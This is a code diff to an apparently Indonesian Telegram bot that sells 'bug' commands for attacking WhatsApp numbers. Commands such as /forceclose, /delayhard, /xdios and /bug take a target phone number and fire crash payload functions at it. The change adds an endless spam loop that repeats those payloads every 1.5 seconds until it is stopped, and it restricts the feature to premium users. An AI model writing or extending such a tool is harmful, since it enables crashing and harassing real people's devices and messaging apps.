@@ -390,6 +390,70 @@ async function catchingOs(target) {
 }
 
 // =====================================================
+// ============ SPAM LOOP ANTI-ERROR ==================
+//  Sistem: paralel, gak ada queue, gak ada lock
+// =====================================================
+const activeSpam = new Map(); // jobId -> { userId, stop, stats: {ok, fail} }
+let spamCounter = 0;
+
+async function spamForever(ctx, label, target, tasks) {
+  const userId = ctx.from.id.toString();
+  const jobId  = `${userId}_${++spamCounter}`;
+
+  activeSpam.set(jobId, { userId, stop: false, stats: { ok: 0, fail: 0 } });
+
+  const startAt = Date.now();
+  let iterasi = 0;
+
+  await ctx.telegram.sendMessage(
+    ctx.chat.id,
+    `🚀 <b>${label}</b> start ke <code>${target.split("@")[0]}</code>\n🆔 Job: <code>${jobId}</code>\n\nKetik /stopbug buat berhentiin semua spam kamu.`,
+    { parse_mode: "HTML" }
+  ).catch(() => {});
+
+  while (true) {
+    const state = activeSpam.get(jobId);
+    if (!state || state.stop) {
+      const durasi = Math.floor((Date.now() - startAt) / 1000);
+      await ctx.telegram.sendMessage(
+        ctx.chat.id,
+        `🛑 <b>${label}</b> (${jobId}) dihentikan\n\n✅ Sukses : ${state?.stats.ok || 0}\n❌ Gagal  : ${state?.stats.fail || 0}\n⏱ Durasi : ${durasi}s`,
+        { parse_mode: "HTML" }
+      ).catch(() => {});
+      activeSpam.delete(jobId);
+      return;
+    }
+
+    iterasi++;
+    let semuaOk = true;
+
+    // Semua task dijalankan, masing-masing di-protect try/catch
+    for (const t of tasks) {
+      try {
+        await t.fn();
+      } catch (e) {
+        semuaOk = false;
+        console.log(`[${label}|${jobId}] ${t.name} err:`, e.message);
+      }
+    }
+
+    if (semuaOk) state.stats.ok++;
+    else state.stats.fail++;
+
+    if (iterasi % 10 === 0) {
+      const durasi = Math.floor((Date.now() - startAt) / 1000);
+      await ctx.telegram.sendMessage(
+        ctx.chat.id,
+        `📊 <b>${label}</b> (${jobId})\n\n🔄 Iterasi : ${iterasi}\n✅ Sukses  : ${state.stats.ok}\n❌ Gagal   : ${state.stats.fail}\n⏱ Durasi  : ${durasi}s`,
+        { parse_mode: "HTML" }
+      ).catch(() => {});
+    }
+
+    await sleep(1500);
+  }
+}
+
+// =====================================================
 // ================== IN MEMORY STORE ==================
 // =====================================================
 function makeInMemoryStore() {
@@ -405,22 +469,6 @@ function makeInMemoryStore() {
   });
   return { chats, messages, contacts, bind: (target) => target.on("messages.upsert", (m) => ev.emit("messages.upsert", m)) };
 }
-
-// =================== TASK QUEUE ===================
-class TaskQueue {
-  constructor() { this.q = []; this.busy = false; }
-  add(job) { this.q.push(job); this.run(); }
-  async run() {
-    if (this.busy) return;
-    this.busy = true;
-    while (this.q.length) {
-      const job = this.q.shift();
-      try { await job(); } catch (e) { console.error("task err:", e.message); }
-    }
-    this.busy = false;
-  }
-}
-const queue = new TaskQueue();
 
 // =================== PREMIUM GROUP ===================
 const PREM_DB = path.join(__dirname, "premgb.json");
@@ -724,7 +772,7 @@ bot.action("/start", async (ctx) => {
   }
 });
 
-// =================== BUG MENU (list command) ===================
+// =================== BUG MENU ===================
 bot.action("/bug_menu", async (ctx) => {
   await ctx.answerCbQuery();
   const msgId = ctx.callbackQuery.message.message_id;
@@ -747,6 +795,8 @@ bot.action("/bug_menu", async (ctx) => {
 <ul>
   <li>/bug • Pilih jenis bug dari tombol</li>
 </ul>
+<hr/>
+<p><i>Ketik /stopbug buat berhentiin spam.</i></p>
 `.trim();
 
   try {
@@ -756,7 +806,7 @@ bot.action("/bug_menu", async (ctx) => {
   } catch (err) { console.log("bug_menu gagal:", err?.response?.description || err.message); }
 });
 
-// =================== BUG PICK MENU (tombol interaktif) ===================
+// =================== BUG PICK MENU ===================
 bot.action("/bug_pick_menu", async (ctx) => {
   await ctx.answerCbQuery();
   const msgId = ctx.callbackQuery.message.message_id;
@@ -822,7 +872,46 @@ bot.action(/^bug_pick_(.+)$/, async (ctx) => {
   } catch (err) { console.log("pick bug err:", err?.response?.description || err.message); }
 });
 
-// =================== NANGKEP NOMOR ===================
+// =================== BUG TASKS BUILDER ===================
+function getBugTasks(bugName, target) {
+  switch (bugName) {
+    case "forceclose":
+      return [
+        { name: "ForcloseVIDEO", fn: () => ForcloseVIDEO(sock, target) },
+        { name: "ForcloseDOC",   fn: () => ForcloseDOC(sock, target)   },
+        { name: "ForcloseSTC",   fn: () => ForcloseSTC(sock, target)   },
+        { name: "nativestc",     fn: () => nativestc(sock, target)     },
+        { name: "BulV1",         fn: () => BulV1(sock, target)         },
+      ];
+    case "delayhard":
+      return [
+        { name: "nativestc", fn: () => nativestc(sock, target) },
+        { name: "BulV1",     fn: () => BulV1(sock, target)     },
+      ];
+    case "ghost":
+      return [
+        { name: "nativestc", fn: () => nativestc(sock, target) },
+        { name: "BulV1",     fn: () => BulV1(sock, target)     },
+      ];
+    case "forcezz":
+      return [
+        { name: "ForcloseVIDEO", fn: () => ForcloseVIDEO(sock, target) },
+        { name: "ForcloseDOC",   fn: () => ForcloseDOC(sock, target)   },
+        { name: "ForcloseSTC",   fn: () => ForcloseSTC(sock, target)   },
+        { name: "nativestc",     fn: () => nativestc(sock, target)     },
+        { name: "BulV1",         fn: () => BulV1(sock, target)         },
+      ];
+    case "xdios":
+      return [
+        { name: "iosswipper", fn: () => iosswipper(sock, target) },
+        { name: "catchingOs", fn: () => catchingOs(target)        },
+      ];
+    default:
+      return [];
+  }
+}
+
+// =================== NANGKEP NOMOR (bug pick) ===================
 bot.on("text", async (ctx, next) => {
   const userId = ctx.from.id;
   const text   = ctx.message?.text || "";
@@ -852,45 +941,27 @@ bot.on("text", async (ctx, next) => {
   if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
   if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
 
-  await ctx.reply(`✅ Menjalankan <b>${label}</b> untuk <code>${rawNumber}</code>`, { parse_mode: "HTML" });
+  const tasks = getBugTasks(bugName, target);
+  if (!tasks.length) return ctx.reply("❌ Bug tidak dikenal.");
 
-  queue.add(async () => {
-    try {
-      switch (bugName) {
-        case "forceclose":
-          await ForcloseVIDEO(sock, target); await sleep(1500);
-          await ForcloseDOC(sock, target);   await sleep(1500);
-          await ForcloseSTC(sock, target);   await sleep(1500);
-          await nativestc(sock, target);     await sleep(1500);
-          await BulV1(sock, target);
-          break;
-        case "delayhard":
-          await nativestc(sock, target); await sleep(1500);
-          await BulV1(sock, target);
-          break;
-        case "ghost":
-          await nativestc(sock, target); await sleep(1500);
-          await BulV1(sock, target);
-          break;
-        case "forcezz":
-          await ForcloseVIDEO(sock, target); await sleep(1500);
-          await ForcloseDOC(sock, target);   await sleep(1500);
-          await ForcloseSTC(sock, target);   await sleep(1500);
-          await nativestc(sock, target);     await sleep(1500);
-          await BulV1(sock, target);
-          break;
-        case "xdios":
-          await iosswipper(sock, target); await sleep(1500);
-          await catchingOs(target);
-          break;
-        default: throw new Error("Bug tidak dikenal");
-      }
-      await ctx.reply(`✅ <b>${label}</b> selesai untuk <code>${rawNumber}</code>`, { parse_mode: "HTML" });
-    } catch (e) {
-      console.error("bug button err:", e.message);
-      await ctx.reply(`❌ <b>${label}</b> gagal untuk <code>${rawNumber}</code>`, { parse_mode: "HTML" });
+  // ← LANGSUNG JALAN, TANPA QUEUE
+  spamForever(ctx, label, target, tasks);
+});
+
+// =================== /stopbug ===================
+bot.command("stopbug", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  let count = 0;
+
+  for (const [jobId, state] of activeSpam.entries()) {
+    if (state.userId === userId) {
+      state.stop = true;
+      count++;
     }
-  });
+  }
+
+  if (count === 0) return ctx.reply("📌 Gak ada spam yang jalan.");
+  return ctx.reply(`🛑 ${count} spam akan dihentikan...`);
 });
 
 // =================== SETTING MENU ===================
@@ -932,129 +1003,180 @@ bot.action("/setting_menu", async (ctx) => {
   } catch (err) { console.log("setting_menu gagal:", err?.response?.description || err.message); }
 });
 
-// =================== COMMAND MANUAL BUG ===================
+// =================== COMMAND MANUAL BUG (ANTI-QUEUE) ===================
 bot.command("delayhard", premGroupOnly(), async (ctx) => {
   const userId = ctx.from.id.toString();
   if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
   if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+
   const args = ctx.message.text.split(" ");
   if (!args[1]) return ctx.reply("📌 Format: /delayhard 628xxxx");
   const target = formatTarget(args[1]);
   if (!target) return ctx.reply("❌ Nomor tidak valid...");
-  await ctx.telegram.sendMessage(ctx.chat.id, `✅ delayhard process mengirim for ${args[1]}`);
-  queue.add(async () => {
-    try {
-      await nativestc(sock, target); await sleep(1500);
-      await BulV1(sock, target);
-      await ctx.telegram.sendMessage(ctx.chat.id, `✅ delayhard bug selesai untuk ${args[1]}`);
-    } catch (e) { await ctx.telegram.sendMessage(ctx.chat.id, `✅ delayhard bug gagal for ${args[1]}`); }
-  });
+
+  const tasks = getBugTasks("delayhard", target);
+  spamForever(ctx, "delayhard", target, tasks); // ← langsung
 });
 
 bot.command("ghost", premGroupOnly(), async (ctx) => {
   const userId = ctx.from.id.toString();
   if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
   if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+
   const args = ctx.message.text.split(" ");
   if (!args[1]) return ctx.reply("📌 Format: /ghost 628xxxx");
   const target = formatTarget(args[1]);
   if (!target) return ctx.reply("❌ Nomor tidak valid...");
-  await ctx.telegram.sendMessage(ctx.chat.id, `✅ ghost process mengirim for ${args[1]}`);
-  queue.add(async () => {
-    try {
-      await nativestc(sock, target); await sleep(1500);
-      await BulV1(sock, target);
-      await ctx.telegram.sendMessage(ctx.chat.id, `✅ ghost bug selesai untuk ${args[1]}`);
-    } catch (e) { await ctx.telegram.sendMessage(ctx.chat.id, `✅ ghost bug gagal for ${args[1]}`); }
-  });
+
+  const tasks = getBugTasks("ghost", target);
+  spamForever(ctx, "ghost", target, tasks);
 });
 
 bot.command("forceclose", premGroupOnly(), async (ctx) => {
   const userId = ctx.from.id.toString();
   if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
   if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+
   const args = ctx.message.text.split(" ");
   if (!args[1]) return ctx.reply("📌 Format: /forceclose 628xxxx");
   const target = formatTarget(args[1]);
   if (!target) return ctx.reply("❌ Nomor tidak valid...");
-  await ctx.telegram.sendMessage(ctx.chat.id, `✅ forceclose process mengirim for ${args[1]}`);
-  queue.add(async () => {
-    try {
-      await ForcloseVIDEO(sock, target); await sleep(1500);
-      await ForcloseDOC(sock, target);   await sleep(1500);
-      await ForcloseSTC(sock, target);   await sleep(1500);
-      await nativestc(sock, target);     await sleep(1500);
-      await BulV1(sock, target);
-      await ctx.telegram.sendMessage(ctx.chat.id, `✅ forceclose bug selesai untuk ${args[1]}`);
-    } catch (e) { await ctx.telegram.sendMessage(ctx.chat.id, `✅ forceclose bug gagal for ${args[1]}`); }
-  });
+
+  const tasks = getBugTasks("forceclose", target);
+  spamForever(ctx, "forceclose", target, tasks);
 });
 
 bot.command("forcezz", premGroupOnly(), async (ctx) => {
   const userId = ctx.from.id.toString();
   if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
   if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+
   const args = ctx.message.text.split(" ");
   if (!args[1]) return ctx.reply("📌 Format: /forcezz 628xxxx");
   const target = formatTarget(args[1]);
   if (!target) return ctx.reply("❌ Nomor tidak valid...");
-  await ctx.telegram.sendMessage(ctx.chat.id, `✅ forcezz process mengirim for ${args[1]}`);
-  queue.add(async () => {
-    try {
-      await ForcloseVIDEO(sock, target); await sleep(1500);
-      await ForcloseDOC(sock, target);   await sleep(1500);
-      await ForcloseSTC(sock, target);   await sleep(1500);
-      await nativestc(sock, target);     await sleep(1500);
-      await BulV1(sock, target);
-      await ctx.telegram.sendMessage(ctx.chat.id, `✅ forcezz bug selesai untuk ${args[1]}`);
-    } catch (e) { await ctx.telegram.sendMessage(ctx.chat.id, `✅ forcezz bug gagal for ${args[1]}`); }
-  });
+
+  const tasks = getBugTasks("forcezz", target);
+  spamForever(ctx, "forcezz", target, tasks);
 });
 
 bot.command("xdios", premGroupOnly(), async (ctx) => {
   const userId = ctx.from.id.toString();
   if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
   if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+
   const args = ctx.message.text.split(" ");
   if (!args[1]) return ctx.reply("📌 Format: /xdios 628xxxx");
   const target = formatTarget(args[1]);
   if (!target) return ctx.reply("❌ Nomor tidak valid...");
-  await ctx.telegram.sendMessage(ctx.chat.id, `✅ xdios process mengirim for ${args[1]}`);
-  queue.add(async () => {
-    try {
-      await iosswipper(sock, target); await sleep(1500);
-      await catchingOs(target);
-      await ctx.telegram.sendMessage(ctx.chat.id, `✅ xdios bug selesai untuk ${args[1]}`);
-    } catch (e) { await ctx.telegram.sendMessage(ctx.chat.id, `✅ xdios bug gagal for ${args[1]}`); }
-  });
+
+  const tasks = getBugTasks("xdios", target);
+  spamForever(ctx, "xdios", target, tasks);
 });
 
-// =================== /bug (crash) — pakai tombol ===================
-bot.command("bug", premGroupOnly(), async (ctx) => {
-  const html = `
-<h2>CRASH BUG</h2>
-<p><i>Pilih metode crash di bawah.</i></p>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<p>Klik tombol, lalu kirim nomor target.</p>
-`.trim();
+// =================== CRASH BUG (/bug) ===================
+const clickedUsers = {};
 
-  const kbd = [
-    [{ text: "Forceclose", callback_data: "bug_pick_forceclose", style: "danger" }],
-    [{ text: "Forcezz",    callback_data: "bug_pick_forcezz",    style: "danger" }],
-    [{ text: "Xdios",      callback_data: "bug_pick_xdios",      style: "primary" }],
-  ];
+bot.command("bug", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 Example : /bug 62xx");
 
-  try {
-    await ctx.telegram.callApi("sendRichMessage", {
-      chat_id: ctx.chat.id, rich_message: { html }, reply_markup: { inline_keyboard: kbd },
-    });
-  } catch {
-    await ctx.replyWithPhoto(thumbnailUrl, {
-      caption: `<b>CRASH BUG</b>\n\nPilih metode di bawah.`, parse_mode: "HTML",
-      reply_markup: { inline_keyboard: kbd },
-    });
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.replyWithPhoto(
+    { source: "./image/MagicClowerd.jpg" },
+    {
+      caption: `
+<blockquote><pre>⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
+⌑ Target : ${q}
+⌑ Status : Ready
+⌑ Note : No Spam Bug
+⌑ Silahkan Pilih bug di bawah...
+╘═——————————————═⬡</pre></blockquote>`,
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒", callback_data: `delay_${target}` },
+            { text: "Force Close", callback_data: `fc_${target}` }
+          ],
+          [
+            { text: "XDioS", callback_data: `blank_${target}` },
+            { text: "Force Freez", callback_data: `bulldozer_${target}` }
+          ]
+        ]
+      }
+    }
+  );
+});
+
+bot.on("callback_query", async (ctx) => {
+  const userId = ctx.from.id;
+  const data   = ctx.callbackQuery.data;
+
+  if (!/^(delay|blank|bulldozer|fc)_/.test(data)) return;
+
+  const [key, target] = data.split("_");
+
+  if (clickedUsers[userId]) {
+    return ctx.answerCbQuery("⚠️ Kamu sudah memilih tombol ini!", { show_alert: true });
   }
+
+  clickedUsers[userId] = true;
+
+  await ctx.answerCbQuery();
+  await ctx.deleteMessage().catch(() => {});
+
+  const methods = {
+    delay: {
+      name: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒",
+      tasks: [
+        { name: "BulV1-1",     fn: () => BulV1(sock, target)     },
+        { name: "nativestc-1", fn: () => nativestc(sock, target) },
+        { name: "BulV1-2",     fn: () => BulV1(sock, target)     },
+        { name: "nativestc-2", fn: () => nativestc(sock, target) },
+      ],
+    },
+    blank: {
+      name: "XDioS",
+      tasks: [
+        { name: "catchingOs", fn: () => catchingOs(target)        },
+        { name: "iosswipper", fn: () => iosswipper(sock, target)  },
+      ],
+    },
+    bulldozer: {
+      name: "Force Freez",
+      tasks: [
+        { name: "VIDEO-1",   fn: () => ForcloseVIDEO(sock, target) },
+        { name: "DOC-1",     fn: () => ForcloseDOC(sock, target)   },
+        { name: "BulV1-1",   fn: () => BulV1(sock, target)         },
+        { name: "native-1",  fn: () => nativestc(sock, target)     },
+        { name: "BulV1-2",   fn: () => BulV1(sock, target)         },
+        { name: "native-2",  fn: () => nativestc(sock, target)     },
+        { name: "STC-1",     fn: () => ForcloseSTC(sock, target)   },
+        { name: "VIDEO-2",   fn: () => ForcloseVIDEO(sock, target) },
+      ],
+    },
+    fc: {
+      name: "Force close",
+      tasks: [
+        { name: "VIDEO-1", fn: () => ForcloseVIDEO(sock, target) },
+        { name: "DOC-1",   fn: () => ForcloseDOC(sock, target)   },
+        { name: "STC-1",   fn: () => ForcloseSTC(sock, target)   },
+        { name: "VIDEO-2", fn: () => ForcloseVIDEO(sock, target) },
+      ],
+    },
+  };
+
+  const method = methods[key];
+  if (!method) return;
+
+  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
+    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
+  }
+
+  // ← LANGSUNG JALAN, TANPA QUEUE & TANPA LOCK
+  spamForever(ctx, method.name, target, method.tasks);
 });
 
 // =================== PAIRING ===================
